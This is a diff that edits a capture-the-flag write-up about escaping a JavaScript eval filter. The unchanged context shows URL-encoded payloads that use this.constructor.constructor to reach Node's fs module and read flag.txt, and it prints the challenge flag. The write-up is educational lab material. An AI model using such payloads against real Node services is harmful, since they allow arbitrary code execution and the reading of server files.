@@ -85,7 +85,7 @@ eval(decodeURIComponent(/this%2Econstructor%2Econstructor(%22return%20this%2Epro
 
 WHAT, it didn't work but at least we have a little sparkle. It done parsed the regex into string, but it didn't evaluate because it wasn't a valid expression. 
 
-Now let me do a trick, I just add another forward slashes at the first and the end of the payload again to comment it out, then use a line break to seperate the command, so we'll have our payload works like a charm:
+Now let me do a trick, I just add another forward slashes at the first and the end of the payload again to comment it out, then use a line break to seperate the command, so we'll have our payload worked like a charm:
 
 ```js
 eval(decodeURIComponent(/%2F%0Athis%2Econstructor%2Econstructor(%22return%20this%2Eprocess%2EmainModule%2Erequire(%27fs%27)%2EreadFileSync(%27flag%2Etxt%27)%22)()%2F/))
@@ -104,6 +104,7 @@ Take the buffer and decode by hex and we'll get the flag yay
 ```
 actf{omg_js_is_like_so_quirky_haha}
 ```
+Nice challenge after all.
 
 Thank you for reading !!!
 
